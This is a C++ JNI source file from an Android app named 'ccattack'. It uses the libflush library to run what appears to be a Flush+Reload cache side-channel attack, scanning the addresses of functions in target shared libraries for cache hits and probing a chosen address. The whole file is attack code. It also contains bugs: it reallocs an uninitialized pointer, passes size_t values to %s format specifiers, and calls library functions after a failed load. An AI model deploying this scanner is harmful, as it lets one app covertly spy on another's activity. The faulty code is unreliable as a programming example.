#include <jni.h>
#include <string>
#include <dlfcn.h>
#include "libflush/libflush/libflush.h"
#include "get_offset.c"
#include "split.c"

size_t l=0;
size_t f;
int (*hit)(int,size_t,size_t *,size_t, size_t);
void (*acs)(void*);
extern "C" JNIEXPORT jstring JNICALL
Java_e_smu_ccattack_MainActivity_scan(
        JNIEnv *env,
        jobject /* this */,
        jint cpu, jobjectArray ranges, jobjectArray offsets, jint fork, jobjectArray filenames, jobjectArray func_lists, jstring target_lib,jstring target_func) {
    //convert target into numeric;
    char* target_l = (char*)env->GetStringUTFChars(target_lib,NULL);
    char* target_f = (char*)env->GetStringUTFChars(target_func,NULL);
    if (!sscanf(target_l, "%p", &l)) {
        LOGE("Could not parse range parameter: %s\n", l);
        exit(0);
    }
    if (!sscanf(target_f, "%p", &f)) {
        LOGE("Could not parse range parameter: %s\n", f);
        exit(0);
    }

    jsize size = env->GetArrayLength(ranges);
    char** func_list; //functions' offsets of every library;
    size_t* addr;
    size_t sum_length = 0;
    //get address list
    for(int i=0;i<size;i++)
    {
        jstring obj = (jstring)env->GetObjectArrayElement(ranges,i);
        char* range = (char*)env->GetStringUTFChars(obj,NULL);
        obj = (jstring)env->GetObjectArrayElement(offsets,i);
        char* offset = (char*)env->GetStringUTFChars(obj,NULL);
        obj = (jstring)env->GetObjectArrayElement(filenames,i);
        char* filename = (char*)env->GetStringUTFChars(obj,NULL);
        obj = (jstring)env->GetObjectArrayElement(func_lists,i);
        size_t length=0;
        char** func_list  = split(',',(char*)env->GetStringUTFChars(obj,NULL),&length);//split a string into function list
        LOGE("Loading %s, filename %s,length %d.",range,filename,length);
        //expand addr[];
        sum_length = sum_length+length;
        addr = static_cast<size_t *>(realloc(addr,sum_length*sizeof(size_t)));
        //get all address list
        sum_length = get_offset(range, offset, addr, func_list, length);
        if(sum_length>2048) //limit the length to 2048
            break;
    }
    LOGE("Sum_Length %d",sum_length);
    //Load libflush
    void *handle;
    handle = dlopen ("libflush.so", RTLD_LAZY);
    if (handle) {
        LOGD("Loading libflush sucessfully");
    }
    hit = (int (*)(int, size_t , size_t *, size_t, size_t)) dlsym(handle, "hit");
    if (!hit)  {
        LOGD("Loading libflush error");
    }
    hit(cpu,fork,addr,sum_length,l+f);// start scaning
    return env->NewStringUTF("");
}

extern "C" JNIEXPORT void JNICALL
        Java_e_smu_ccattack_MainActivity_access(JNIEnv *env,
                                            jstring target_lib, jstring target_func) {
    if(l==0) {//if l==0, load it.
        char *target_l = (char *) env->GetStringUTFChars(target_lib, NULL);
        char *target_f = (char *) env->GetStringUTFChars(target_func, NULL);
        if (!sscanf(target_l, "%p", &l)) {
            LOGE("Could not parse range parameter: %s\n", l);
            exit(0);
        }
        if (!sscanf(target_f, "%p", &f)) {
            LOGE("Could not parse range parameter: %s\n", f);
            exit(0);
        }
    }

    void *ac;//load access function
    ac = dlopen ("libflush.so", RTLD_LAZY);
    //void (*acs);
    acs = (void (*)(void *)) dlsym(ac, "libflush_access_memory");
    if (!acs)  {
        LOGE("loading libflush error");
        exit(0);
    }
    acs((void*)(l+f));//access the address in memory
    LOGD("access: %p\n", l+f);
 }
